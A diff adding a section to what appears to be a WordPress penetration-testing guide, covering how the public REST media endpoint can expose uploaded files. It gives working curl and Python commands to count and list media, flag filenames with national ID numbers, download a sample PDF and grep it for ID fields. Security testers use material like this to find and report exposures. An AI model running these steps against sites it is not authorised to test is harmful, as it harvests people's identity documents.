@@ -220,6 +220,69 @@ xmlrpc.php is enabled by default and allows credential brute force bypassing loc
 
 ---
 
+## REST API — Media Endpoint (HIGH PRIORITY: PII Exposure Vector)
+
+**MANDATORY CHECK on every WordPress target.** The `/wp-json/wp/v2/media` endpoint is publicly
+accessible by default and exposes ALL uploaded file URLs including PDFs, DOCX, and images.
+If the site handles user data (forms, registrations, applications), this endpoint can expose
+consent forms, identity documents, and other files containing PII.
+
+    # STEP 1: Check total media count (X-WP-Total header reveals scope instantly)
+    curl -sk "https://TARGET/wp-json/wp/v2/media?per_page=1" \
+      -H "Accept: application/json" -I | grep -i "X-WP-Total"
+    # If X-WP-Total: 500+, there are hundreds of potentially sensitive files
+
+    # STEP 2: Enumerate PDFs specifically
+    curl -sk "https://TARGET/wp-json/wp/v2/media?mime_type=application%2Fpdf&per_page=100&page=1" \
+      -H "Accept: application/json" | python3 -c "
+import sys, json, re
+from urllib.parse import unquote
+items = json.load(sys.stdin)
+print(f'PDFs found: {len(items)}')
+for item in items:
+    src = item.get('source_url','')
+    fn = unquote(src.split('/')[-1])
+    # Flag filenames with long digit sequences (NIK, ID numbers)
+    flag = '[PII?]' if re.search(r'\d{12,18}', fn) else ''
+    print(f'{flag} {fn}')
+    print(f'   URL: {src}')
+"
+
+    # STEP 3: Also check DOCX and XLSX
+    curl -sk "https://TARGET/wp-json/wp/v2/media?mime_type=application%2Fvnd.openxmlformats-officedocument.wordprocessingml.document&per_page=100" \
+      -H "Accept: application/json" | python3 -c "
+import sys, json
+items = json.load(sys.stdin)
+print(f'DOCX found: {len(items)}')
+for item in items[:10]:
+    print(item.get('source_url',''))
+"
+
+    # STEP 4: Download and confirm PII in one sample PDF
+    PDF_URL="https://TARGET/wp-content/uploads/2024/01/Consent-Form-JohnDoe-1234567890123456.pdf"
+    curl -sk "$PDF_URL" -o /tmp/sample.pdf
+    pdftotext /tmp/sample.pdf - | grep -iE "NIK|KTP|Nama Lengkap|National ID|Social Security|Passport"
+
+    # STEP 5: Get total affected (ALL MIME types, not just PDF)
+    for mime in "application/pdf" "application/msword" "image/jpeg" "image/png"; do
+      total=$(curl -sk "https://TARGET/wp-json/wp/v2/media?mime_type=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$mime'))")&per_page=1" \
+        -H "Accept: application/json" -D - 2>/dev/null | grep -i 'x-wp-total:' | grep -oE '[0-9]+')
+      echo "$mime: ${total:-0} files"
+    done
+
+**CRITICAL:** If `/wp-json/wp/v2/media` returns PDFs with names containing long digit strings
+(Indonesian NIK = 16 digits, Singaporean NRIC = 9 chars, etc.), this is a HIGH-severity
+PII exposure finding. Load `vulnerabilities/sensitive_file_pii_exposure.md` for full
+exploitation and confirmation methodology.
+
+**What to report:**
+- Total PDF count (from X-WP-Total header)
+- Sample of PII-indicating filenames (masked)
+- Confirmed PII fields from extracted text (masked)
+- Applicable data protection regulation
+
+---
+
 ## File Upload / Media
 
     # Uploaded files at:
